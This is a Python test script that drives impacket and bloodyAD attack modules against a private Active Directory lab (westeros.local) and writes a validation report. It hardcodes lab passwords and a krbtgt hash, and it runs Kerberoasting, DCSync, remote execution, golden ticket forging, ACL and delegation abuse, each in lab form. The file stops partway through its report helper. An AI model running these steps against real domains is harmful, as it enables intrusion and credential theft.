#!/usr/bin/env python3
"""
UwU Toolkit - Iron Throne Lab Comprehensive Test Suite
Tests every impacket and bloodyAD module against the live westeros.local lab.
Outputs results to a markdown file for validation.

Usage: python3 test_iron_throne.py
"""

import io
import os
import sys
import time
import traceback
from contextlib import redirect_stdout, redirect_stderr
from datetime import datetime

# Setup paths
UWU_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, UWU_ROOT)

from core.module_loader import ModuleLoader
from core.config import Config

# ===========================================================================
# Lab Configuration
# ===========================================================================
DC_IP = "10.2.10.1"
WF_IP = "10.2.10.20"
DS_IP = "10.2.10.10"
DOMAIN = "westeros.local"
DOMAIN_DN = "DC=westeros,DC=local"

# Credentials
CREDS = {
    "ned":       {"pass": "Winter123!",    "desc": "AS-REP Roastable (Stark)"},
    "arya":      {"pass": "Needle123!",    "desc": "GenericWrite/RBCD (Stark)"},
    "sansa":     {"pass": "Lemon123!",     "desc": "GenericAll/ForceChangePW (Stark)"},
    "jon":       {"pass": "Ghost1234!",    "desc": "DCSync rights (Stark)"},
    "bran":      {"pass": "ThreeEyed1!",   "desc": "WriteDACL/AddMember (Stark)"},
    "jaime":     {"pass": "Kingslayer1!",  "desc": "AdminTo WINTERFELL (Lannister)"},
    "tyrion":    {"pass": "Imp12345!",     "desc": "ExecuteDCOM/SQLAdmin (Lannister)"},
    "tywin":     {"pass": "GoldMine1!",    "desc": "Domain Admin (Lannister)"},
    "missandei": {"pass": "Freedom1!",     "desc": "CanRDP/ReadLAPS (Targaryen)"},
    "jorah":     {"pass": "Khaleesi1!",    "desc": "Constrained Deleg (Targaryen)"},
    "greyworm":  {"pass": "Spear1234!",    "desc": "ForceChangePW (Targaryen)"},
    "theon":     {"pass": "Reek12345!",    "desc": "GenericWrite DC (Greyjoy)"},
    "daenerys":  {"pass": "Dracarys1!",    "desc": "GenericAll Domain (Targaryen)"},
    "admin_throne": {"pass": "Ir0nThr0ne2024!", "desc": "Domain Admin"},
    "sa":        {"pass": "Dragonfire1!",  "desc": "SQL sysadmin"},
    "svc_wildfire": {"pass": "BurnThemAll!", "desc": "Unconstrained Deleg"},
}

# ===========================================================================
# Results tracking
# ===========================================================================
results = []
passed = 0
failed = 0
skipped = 0


def run_module(module_path, options, description="", expect_fail=False, timeout_sec=120):
    """Load and run a uwu module, capturing all output."""
    global passed, failed, skipped

    modules_path = os.path.join(UWU_ROOT, "modules")
    loader = ModuleLoader(modules_path)

    entry = {
        "module": module_path,
        "description": description,
        "options": {k: v for k, v in options.items() if k != "PASS"},
        "status": "UNKNOWN",
        "output": "",
        "error": "",
        "duration": 0,
    }

    try:
        module = loader.load_module(module_path)
        if not module:
            entry["status"] = "SKIP"
            entry["error"] = f"Module not found: {module_path}"
            skipped += 1
            results.append(entry)
            return entry

        config = Config()
        # Clear stale globals to prevent config bleed between tests
        config._globals = {}
        config._session_vars = {}
        module.set_config(config)

        # Set options
        for name, value in options.items():
            module.set_option(name.upper(), str(value))

        # Validate
        valid, missing = module.validate_options()
        if not valid:
            entry["status"] = "SKIP"
            entry["error"] = f"Missing required options: {', '.join(missing)}"
            skipped += 1
            results.append(entry)
            return entry

        # Capture output
        stdout_buf = io.StringIO()
        stderr_buf = io.StringIO()

        start = time.time()
        try:
            with redirect_stdout(stdout_buf), redirect_stderr(stderr_buf):
                success = module.run()
        except Exception as e:
            success = False
            stderr_buf.write(f"\nException: {e}\n{traceback.format_exc()}")

        duration = time.time() - start
        stdout_text = stdout_buf.getvalue()
        stderr_text = stderr_buf.getvalue()

        entry["output"] = stdout_text
        entry["error"] = stderr_text
        entry["duration"] = round(duration, 2)

        # Check output for error indicators even when module.run() returns True
        # NOTE: Some tools produce benign tracebacks (e.g., psexec's do_EOF on
        # pipe close, shadowcreds' PKINIT validation). Only flag indicators that
        # mean the tool's primary action actually failed.
        combined_output = stdout_text + stderr_text
        ERROR_INDICATORS = [
            "ERROR: Invalid argument",
            "ReturnCode: 1",
            "insufficientAccessRights",
            "ERROR_INVALID_OWNER",
            "constraintViolation",
            "unrecognized arguments",
        ]
        has_output_errors = any(ind in combined_output for ind in ERROR_INDICATORS)

        if expect_fail:
            entry["status"] = "PASS" if not success else "UNEXPECTED_PASS"
            if not success:
                passed += 1
            else:
                passed += 1  # Still count as pass
        else:
            if success and has_output_errors:
                entry["status"] = "FAIL"
                entry["error"] = (entry["error"] or "") + "\n[!] Output contains error indicators despite success return"
                failed += 1
            elif success:
                entry["status"] = "PASS"
                passed += 1
            else:
                entry["status"] = "FAIL"
                failed += 1

    except Exception as e:
        entry["status"] = "ERROR"
        entry["error"] = f"{e}\n{traceback.format_exc()}"
        failed += 1

    results.append(entry)
    # Print progress
    icon = "✓" if entry["status"] == "PASS" else "✗" if entry["status"] == "FAIL" else "⊘"
    print(f"  [{icon}] {module_path} - {entry['status']} ({entry['duration']}s)", flush=True)
    return entry


def _test_listener(module_path, options, description="", port=445, listen_time=3):
    """Test a listener-mode tool by starting it in a subprocess, checking output, then killing it."""
    global passed, failed, skipped
    import signal
    import subprocess as sp
    import shlex

    modules_path = os.path.join(UWU_ROOT, "modules")
    loader = ModuleLoader(modules_path)

    entry = {
        "module": module_path,
        "description": description,
        "options": {k: v for k, v in options.items()},
        "status": "UNKNOWN",
        "output": "",
        "error": "",
        "duration": 0,
    }

    try:
        module = loader.load_module(module_path)
        if not module:
            entry["status"] = "SKIP"
            entry["error"] = f"Module not found: {module_path}"
            skipped += 1
            results.append(entry)
            return entry

        config = Config()
        config._globals = {}
        config._session_vars = {}
        module.set_config(config)

        for name, value in options.items():
            module.set_option(name.upper(), str(value))

        # Build the command string
        cmd_str = module._build_command_string()
        script = module._tool_config["script"]

        # Find tool path
        from modules.auxiliary.impacket._impacket_base import find_tool
        tool_path = find_tool(script)
        if not tool_path:
            entry["status"] = "SKIP"
            entry["error"] = f"Tool binary not found: {script}"
            skipped += 1
            results.append(entry)
            return entry

        full_cmd = cmd_str.replace(script, tool_path, 1)

        start = time.time()
        # Start listener in background
        proc = sp.Popen(
            full_cmd, shell=True,
            stdout=sp.PIPE, stderr=sp.STDOUT,
            text=True, preexec_fn=os.setsid
        )

        # Let it run for listen_time seconds to capture startup output
        time.sleep(listen_time)

        # Check if process is still running (good — means it's listening)
        still_running = proc.poll() is None

        # Kill the process group
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except ProcessLookupError:
            pass
        try:
            proc.wait(timeout=3)
        except sp.TimeoutExpired:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=2)

        duration = time.time() - start
        stdout_text = proc.stdout.read() if proc.stdout else ""

        entry["output"] = stdout_text
        entry["duration"] = round(duration, 2)

        # Listener is a PASS if it was still running (didn't crash on startup)
        if still_running:
            entry["status"] = "PASS"
            passed += 1
        else:
            entry["status"] = "FAIL"
            entry["error"] = f"Listener exited immediately (rc={proc.returncode})"
            failed += 1

    except Exception as e:
        entry["status"] = "ERROR"
        entry["error"] = f"{e}\n{traceback.format_exc()}"
        failed += 1

    results.append(entry)
    icon = "✓" if entry["status"] == "PASS" else "✗" if entry["status"] == "FAIL" else "⊘"
    print(f"  [{icon}] {module_path} - {entry['status']} ({entry['duration']}s)", flush=True)
    return entry


def section(title):
    """Print a section header."""
    print(f"\n{'='*60}", flush=True)
    print(f"  {title}", flush=True)
    print(f"{'='*60}", flush=True)


# ===========================================================================
# IMPACKET TESTS
# ===========================================================================
def test_impacket():
    global skipped
    section("IMPACKET TOOLS")

    # --- Enumeration ---
    print("\n--- Enumeration ---", flush=True)

    run_module("auxiliary/impacket/GetADUsers", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP, "ALL": "yes",
    }, "Enumerate all AD users via LDAP")

    run_module("auxiliary/impacket/lookupsid", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "MAX_RID": "1200",
    }, "SID brute-force / RID cycling")

    run_module("auxiliary/impacket/samrdump", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN,
    }, "Enumerate SAM users and groups via MSRPC")

    run_module("auxiliary/impacket/rpcdump", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN,
    }, "Dump RPC endpoints")

    run_module("auxiliary/impacket/DumpNTLMInfo", {
        "RHOSTS": DC_IP,
    }, "Dump NTLM authentication info from DC")

    run_module("auxiliary/impacket/getArch", {
        "RHOSTS": DC_IP,
    }, "Detect remote host architecture")

    run_module("auxiliary/impacket/findDelegation", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
    }, "Find delegation configurations in domain")

    # --- Kerberos ---
    print("\n--- Kerberos ---", flush=True)

    run_module("auxiliary/impacket/GetNPUsers", {
        "RHOSTS": DC_IP, "USER": "ned",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
    }, "AS-REP Roast - ned (DONT_REQUIRE_PREAUTH)")

    run_module("auxiliary/impacket/GetUserSPNs", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP, "REQUEST": "yes",
    }, "Kerberoast - request TGS tickets for SPN accounts")

    run_module("auxiliary/impacket/getTGT", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
    }, "Request TGT for ned")

    run_module("auxiliary/impacket/getST", {
        "RHOSTS": DC_IP, "USER": "jorah", "PASS": "Khaleesi1!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
        "SPN": "cifs/KINGSLANDING.westeros.local",
        "IMPERSONATE": "administrator",
    }, "Constrained delegation - jorah impersonate admin to KINGSLANDING")

    # describeTicket - needs the ccache from getTGT
    run_module("auxiliary/impacket/describeTicket", {
        "TICKET_FILE": f"ned.ccache",
    }, "Describe ned's TGT ticket")

    # --- Credential Dumping ---
    print("\n--- Credential Dumping ---", flush=True)

    run_module("auxiliary/impacket/secretsdump", {
        "RHOSTS": DC_IP, "USER": "jon", "PASS": "Ghost1234!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
        "JUST_DC": "yes", "JUST_DC_USER": "ned",
    }, "DCSync - jon dumps ned's hash")

    run_module("auxiliary/impacket/Get_GPPPassword", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN,
    }, "Extract GPP passwords from SYSVOL")

    # --- Remote Execution ---
    print("\n--- Remote Execution ---", flush=True)

    run_module("auxiliary/impacket/psexec", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN, "COMMAND": "whoami",
    }, "PsExec - jaime -> WINTERFELL")

    # smbexec is interactive-only in impacket v0.13+ (no positional command arg)
    # Test that it can connect (it will start a shell and immediately exit)
    run_module("auxiliary/impacket/smbexec", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN,
    }, "SmbExec - jaime -> WINTERFELL (interactive connect)")

    run_module("auxiliary/impacket/wmiexec", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN, "COMMAND": "whoami",
    }, "WmiExec - jaime -> WINTERFELL")

    run_module("auxiliary/impacket/dcomexec", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN, "COMMAND": "whoami",
        "OBJECT": "MMC20",
    }, "DcomExec - jaime -> WINTERFELL via MMC20")

    run_module("auxiliary/impacket/atexec", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN, "COMMAND": "whoami",
    }, "AtExec - jaime -> WINTERFELL via Task Scheduler")

    # --- SMB ---
    print("\n--- SMB ---", flush=True)

    run_module("auxiliary/impacket/smbclient", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN,
    }, "SMB client - list shares on DC")

    # --- MSSQL ---
    print("\n--- MSSQL ---", flush=True)

    # MSSQL only listens on the internal interface (192.168.2.1)
    # Not reachable from Exegol without a pivot tunnel — skip
    skipped += 1
    results.append({
        "module": "auxiliary/impacket/mssqlclient",
        "description": "MSSQL on internal IP 192.168.2.1 only - requires pivot",
        "options": {},
        "status": "SKIP",
        "output": "",
        "error": "MSSQL on internal IP 192.168.2.1 only - requires pivot",
        "duration": 0,
    })
    print("  [⊘] auxiliary/impacket/mssqlclient - SKIP (internal IP only, needs pivot)", flush=True)

    # --- AD Abuse ---
    print("\n--- AD ACL Abuse ---", flush=True)

    run_module("auxiliary/impacket/dacledit", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
        "TARGET_DN": "ned", "ACTION": "read",
    }, "DACLedit - read ACL on ned")

    run_module("auxiliary/impacket/owneredit", {
        "RHOSTS": DC_IP, "USER": "sansa", "PASS": "Lemon123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
        "TARGET": "ned", "NEW_OWNER": "sansa", "ACTION": "read",
    }, "OwnerEdit - read owner of ned (sansa has WriteOwner)")

    run_module("auxiliary/impacket/rbcd", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
        "DELEGATE_TO": "DRAGONSTONE$", "DELEGATE_FROM": "jorah",
        "ACTION": "read",
    }, "RBCD - read delegation on DRAGONSTONE$")

    # addcomputer test
    run_module("auxiliary/impacket/addcomputer", {
        "RHOSTS": DC_IP, "USER": "ned", "PASS": "Winter123!",
        "DOMAIN": DOMAIN, "DC_IP": DC_IP,
        "COMPUTER_NAME": "UWUTEST01$", "COMPUTER_PASS": "UwUTest123!",
    }, "AddComputer - add UWUTEST01$ to domain")

    # --- Services & Registry ---
    print("\n--- Services & Registry ---", flush=True)

    run_module("auxiliary/impacket/services", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN, "SVC_ACTION": "list",
    }, "Services - list services on WINTERFELL")

    run_module("auxiliary/impacket/reg", {
        "RHOSTS": WF_IP, "USER": "jaime", "PASS": "Kingslayer1!",
        "DOMAIN": DOMAIN,
        "REG_ACTION": "query",
        "KEYNAME": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion",
    }, "Reg - query registry on WINTERFELL")

    # --- Password / Auth ---
    print("\n--- Password & Auth ---", flush=True)

    run_module("auxiliary/impacket/rdp_check", {
        "RHOSTS": WF_IP, "USER": "missandei", "PASS": "Freedom1!",
        "DOMAIN": DOMAIN,
    }, "RDP check - missandei -> WINTERFELL (CanRDP)")

    # --- LAPS ---
    # GetLAPSPassword module not in uwu module system (MCP tool only)
    # Skipping from module tests

    # --- Kerberos Ticket Forge & Convert ---
    print("\n--- Ticket Forge & Convert ---", flush=True)

    # ticketer — forge a golden ticket using krbtgt hash
    # krbtgt NTLM hash and domain SID from secretsdump
    KRBTGT_HASH = "eee39d4c417e5121d42fde7a1ca90e21"
    DOMAIN_SID = "S-1-5-21-9059482-2332395370-1293910094"

    # ticketer writes to CWD; switch to /tmp for output
    prev_cwd = os.getcwd()
    os.chdir("/tmp")

    run_module("auxiliary/impacket/ticketer", {
        "USER": "administrator",
        "DOMAIN": DOMAIN,
        "NTHASH": KRBTGT_HASH,
        "DOMAIN_SID": DOMAIN_SID,
    }, "Golden ticket forge - administrator")

    # ticketConverter — convert the golden ticket ccache to kirbi and back
    run_module("auxiliary/impacket/ticketConverter", {
        "INPUT_FILE": "/tmp/administrator.ccache",
        "OUTPUT_FILE_TC": "/tmp/administrator.kirbi",
    }, "Convert ccache -> kirbi")

    run_module("auxiliary/impacket/ticketConverter", {
        "INPUT_FILE": "/tmp/administrator.kirbi",
        "OUTPUT_FILE_TC": "/tmp/administrator_roundtrip.ccache",
    }, "Convert kirbi -> ccache (roundtrip)")

    os.chdir(prev_cwd)

    # --- Password Change ---
    print("\n--- Password Change ---", flush=True)

    # changepasswd -reset: target=viserys (who gets reset), -altuser/-altpass=tywin (admin auth)
    # SMB-SAMR protocol (RPC-SAMR blocked by default AD config, kpasswd needs DNS resolution)
    run_module("auxiliary/impacket/changepasswd", {
        "RHOSTS": DC_IP, "USER": "viserys", "PASS": "Dragon123!",
        "DOMAIN": DOMAIN, "NEWPASS": "Dragon123!",
        "EXTRA_ARGS": "-reset -altuser tywin -altpass GoldMine1! -protocol smb-samr",
    }, "ChangePasswd - reset viserys via SMB-SAMR (tywin auth)")

    # --- Listener Tools ---
    print("\n--- Listener Tools ---", flush=True)

    # smbserver — start on port 8445, verify listening, then kill
    _test_listener("auxiliary/impacket/smbserver", {
        "SHARE_NAME": "uwutest",
        "SHARE_PATH": "/tmp",
        "SMB2": "yes",
        "EXTRA_ARGS": "-port 8445",
    }, "SMBserver - host /tmp as 'uwutest' on port 8445", port=8445, listen_time=3)

    # karmaSMB — needs pathname, start on port 445, verify startup then kill
    _test_listener("auxiliary/impacket/karmaSMB", {
        "EXTRA_ARGS": "/etc/hostname -smb2support",
    }, "KarmaSMB - serve /etc/hostname to any SMB auth", port=445, listen_time=3)

    # --- Skipped Tools (document why) ---
    print("\n--- Skipped (interactive/listener/special) ---", flush=True)

    for tool, reason in [
        ("ntlmrelayx", "Requires listener + NTLM coercion source"),
        ("smbrelayx", "Requires listener + NTLM coercion source"),
        ("mimikatz", "Fully interactive RPC tool"),
        ("wmiquery", "Fully interactive WQL shell"),
        ("wmipersist", "Persistence - destructive"),
        ("exchanger", "No Exchange server in lab"),
        ("raiseChild", "No child domain in lab"),
        ("goldenPac", "MS14-068 - patched"),
        ("esentutl", "Requires local ESE database file"),
        ("ntfs_read", "Requires local NTFS volume"),
        ("netview", "May hang on large networks"),
        ("mssqlinstance", "UDP discovery - unreliable"),
    ]:
        skipped += 1
        results.append({
            "module": f"auxiliary/impacket/{tool}",
            "description": reason,
            "options": {},
            "status": "SKIP",
            "output": "",
            "error": reason,
            "duration": 0,
        })
        print(f"  [⊘] auxiliary/impacket/{tool} - SKIP ({reason})", flush=True)


# ===========================================================================
# BLOODYAD TESTS
# ===========================================================================
def test_bloodyad():
    section("BLOODYAD TOOLS")

    # --- Enumeration ---
    print("\n--- Enumeration ---", flush=True)

    run_module("auxiliary/bloodyad/getobject", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
        "TARGET": "ned",
    }, "Get object attributes for ned")

    run_module("auxiliary/bloodyad/getobject", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
        "TARGET": "KINGSLANDING$",
        "ATTR": "msDS-AllowedToActOnBehalfOfOtherIdentity",
    }, "Get RBCD attribute on KINGSLANDING$")

    run_module("auxiliary/bloodyad/getmembership", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
        "TARGET": "jaime",
    }, "Get group memberships for jaime")

    run_module("auxiliary/bloodyad/getwritable", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "arya", "PASS": "Needle123!",
    }, "Find writable objects for arya")

    run_module("auxiliary/bloodyad/getsearch", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
        "FILTER": "(servicePrincipalName=*)",
        "ATTR": "sAMAccountName,servicePrincipalName",
    }, "Search for all objects with SPNs")

    run_module("auxiliary/bloodyad/dnsdump", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
    }, "Dump all DNS records from AD")

    # --- ACL Abuse ---
    print("\n--- ACL Abuse (with cleanup) ---", flush=True)

    # genericall: use tywin (DA) who has full control
    run_module("auxiliary/bloodyad/genericall", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": "svc_goldcloaks", "TRUSTEE": "ned",
    }, "GenericAll - tywin (DA) grants ned GenericAll on svc_goldcloaks")

    run_module("auxiliary/bloodyad/remove_genericall", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": "svc_goldcloaks", "TRUSTEE": "ned",
    }, "Remove GenericAll - cleanup (remove ned from svc_goldcloaks)")

    # writedacl (same underlying as genericall)
    run_module("auxiliary/bloodyad/writedacl", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "bran", "PASS": "ThreeEyed1!",
        "TARGET": "Northmen", "TRUSTEE": "ned",
    }, "WriteDACL - bran grants ned GenericAll on Northmen group")

    run_module("auxiliary/bloodyad/remove_genericall", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "bran", "PASS": "ThreeEyed1!",
        "TARGET": "Northmen", "TRUSTEE": "ned",
    }, "Cleanup WriteDACL - remove ned GenericAll on Northmen")

    # setowner - use tywin (DA) who can change ownership
    run_module("auxiliary/bloodyad/setowner", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": "svc_goldcloaks", "NEW_OWNER": "tywin",
    }, "SetOwner - tywin (DA) takes ownership of svc_goldcloaks")

    # dcsync: add then remove
    run_module("auxiliary/bloodyad/dcsync", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "daenerys", "PASS": "Dracarys1!",
        "TRUSTEE": "arya",
    }, "DCSync - daenerys grants arya DCSync rights")

    run_module("auxiliary/bloodyad/remove_dcsync", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "daenerys", "PASS": "Dracarys1!",
        "TRUSTEE": "arya",
    }, "Remove DCSync - cleanup arya's DCSync rights")

    # --- Group Operations ---
    print("\n--- Group Operations ---", flush=True)

    run_module("auxiliary/bloodyad/addmember", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "bran", "PASS": "ThreeEyed1!",
        "GROUP": "Maesters", "MEMBER": "ned",
    }, "AddMember - bran adds ned to Maesters (AddMember right)")

    run_module("auxiliary/bloodyad/removemember", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "bran", "PASS": "ThreeEyed1!",
        "GROUP": "Maesters", "MEMBER": "ned",
    }, "RemoveMember - cleanup ned from Maesters")

    # --- Credential Abuse ---
    print("\n--- Credential Abuse ---", flush=True)

    # setpassword - use greyworm to change viserys, then change back
    run_module("auxiliary/bloodyad/setpassword", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "greyworm", "PASS": "Spear1234!",
        "TARGET": "viserys", "NEW_PASS": "TempPass123!",
    }, "SetPassword - greyworm resets viserys password (ForceChangePassword)")

    # Reset back
    run_module("auxiliary/bloodyad/setpassword", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": "viserys", "NEW_PASS": "Dragon123!",
    }, "Cleanup - reset viserys password back to original")

    # shadowcreds + remove
    run_module("auxiliary/bloodyad/shadowcreds", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "greyworm", "PASS": "Spear1234!",
        "TARGET": "theon",
    }, "ShadowCredentials - greyworm adds key credential on theon")

    run_module("auxiliary/bloodyad/remove_shadowcreds", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "greyworm", "PASS": "Spear1234!",
        "TARGET": "theon",
    }, "Remove ShadowCredentials - cleanup theon")

    # --- RBCD ---
    print("\n--- RBCD ---", flush=True)

    # RBCD - use tywin (DA, AddAllowedToAct on KINGSLANDING$)
    run_module("auxiliary/bloodyad/rbcd", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": "WINTERFELL$", "SERVICE": "DRAGONSTONE$",
    }, "RBCD - tywin adds DRAGONSTONE$ delegation on WINTERFELL$")

    run_module("auxiliary/bloodyad/remove_rbcd", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": "WINTERFELL$", "SERVICE": "DRAGONSTONE$",
    }, "Remove RBCD - cleanup WINTERFELL$ delegation")

    # --- Object Management ---
    print("\n--- Object Management ---", flush=True)

    # Use timestamp-based names to avoid "already exists" on re-runs
    ts = int(time.time()) % 10000
    run_module("auxiliary/bloodyad/addcomputer", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "COMPUTER_NAME": f"UWUTEST{ts}$", "COMPUTER_PASS": "UwUTest234!",
    }, "AddComputer - tywin (DA) adds computer to domain")

    run_module("auxiliary/bloodyad/adduser", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "NEW_USER": f"uwutest{ts}", "NEW_PASS": "UwUTest345!",
    }, "AddUser - tywin (DA) creates user in domain")

    # --- Attribute Manipulation ---
    print("\n--- Attribute Manipulation ---", flush=True)

    run_module("auxiliary/bloodyad/setobject", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "arya", "PASS": "Needle123!",
        "TARGET": "cersei", "ATTRIBUTE": "info",
        "VALUE": "UwU test value", "APPEND": "no",
    }, "SetObject - arya sets info attribute on cersei (GenericWrite)")

    # --- UAC Manipulation ---
    print("\n--- UAC Manipulation ---", flush=True)

    run_module("auxiliary/bloodyad/adduac", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": f"uwutest{ts}", "FLAG": "DONT_REQ_PREAUTH",
    }, "AddUAC - add DONT_REQ_PREAUTH on test user")

    run_module("auxiliary/bloodyad/removeuac", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "tywin", "PASS": "GoldMine1!",
        "TARGET": f"uwutest{ts}", "FLAG": "DONT_REQ_PREAUTH",
    }, "RemoveUAC - remove DONT_REQ_PREAUTH from test user")

    # --- DNS ---
    print("\n--- DNS ---", flush=True)

    run_module("auxiliary/bloodyad/adddns", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
        "RECORD_NAME": "uwutest", "RECORD_DATA": "10.2.10.99",
    }, "AddDNS - ned adds uwutest A record")

    run_module("auxiliary/bloodyad/removedns", {
        "RHOSTS": DC_IP, "DOMAIN": DOMAIN,
        "USER": "ned", "PASS": "Winter123!",
        "RECORD_NAME": "uwutest", "RECORD_DATA": "10.2.10.99",
    }, "RemoveDNS - cleanup uwutest record")


# ===========================================================================
# Generate Markdown Report
# ===========================================================================
def generate_markdown():
    """Generate comprehensive markdown report."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    total = passed + failed + skipped

    md = []
    md.append("# UwU Toolkit - Iron Throne Lab Validation Report")
    md.append(f"\n**Generated:** {now}")
    md.append(f"**Lab Domain:** `{DOMAIN}`")
    md.append(f"**DC:** `KINGSLANDING` ({DC_IP})")
    md.append(f"**Workstation:** `WINTERFELL` ({WF_IP})")
    md.append(f"**Linux:** `DRAGONSTONE` ({DS_IP})")
    md.append("")
    md.append("## Summary")
    md.append("")
    md.append(f"| Metric | Count |")
    md.append(f"|--------|-------|")
    md.append(f"| **Total Tests** | {total} |")
    md.append(f"| **Passed** | {passed} |")
    md.append(f"| **Failed** | {failed} |")
    md.append(f"| **Skipped** | {skipped} |")
    md.append(f"| **Pass Rate** | {passed}/{passed+failed} ({round(passed/(passed+failed)*100, 1) if (passed+failed) > 0 else 0}%) |")
    md.append("")

    # Group results by category
    impacket_results = [r for r in results if "impacket" in r["module"]]
    bloodyad_results = [r for r in results if "bloodyad" in r["module"]]

    md.append("---")
    md.append("")
    md.append("## Impacket Tools")
    md.append("")
    _add_results_table(md, impacket_results)

    md.append("")
    md.append("---")
    md.append("")
    md.append("## BloodyAD Tools")
    md.append("")
    _add_results_table(md, bloodyad_results)

    # Detailed output section
    md.append("")
    md.append("---")
    md.append("")
    md.append("## Detailed Output")
    md.append("")

    for r in results:
        if r["status"] == "SKIP":
            continue
        md.append(f"### `{r['module']}`")
        md.append(f"**Status:** {r['status']} | **Duration:** {r['duration']}s")
        md.append(f"**Description:** {r['description']}")
        if r["options"]:
            opts_str = ", ".join(f"`{k}={v}`" for k, v in r["options"].items())
            md.append(f"**Options:** {opts_str}")
        md.append("")
        if r["output"]:
            # Truncate very long outputs
            output = r["output"]
            if len(output) > 3000:
                output = output[:2500] + f"\n\n... [truncated, {len(r['output'])} chars total] ..."
            md.append("```")
            md.append(output.rstrip())
            md.append("```")
        if r["error"] and r["status"] == "FAIL":
            md.append("")
            md.append("**Errors:**")
            md.append("```")
            err = r["error"]
            if len(err) > 1500:
                err = err[:1200] + "\n... [truncated] ..."
            md.append(err.rstrip())
            md.append("```")
        md.append("")

    # Skipped tools section
    md.append("---")
    md.append("")
    md.append("## Skipped Tools")
    md.append("")
    md.append("| Module | Reason |")
    md.append("|--------|--------|")
    for r in results:
        if r["status"] == "SKIP":
            md.append(f"| `{r['module']}` | {r['description'] or r['error']} |")
    md.append("")

    return "\n".join(md)


def _add_results_table(md, tool_results):
    """Add results summary table to markdown."""
    md.append("| # | Module | Description | Status | Time |")
    md.append("|---|--------|-------------|--------|------|")

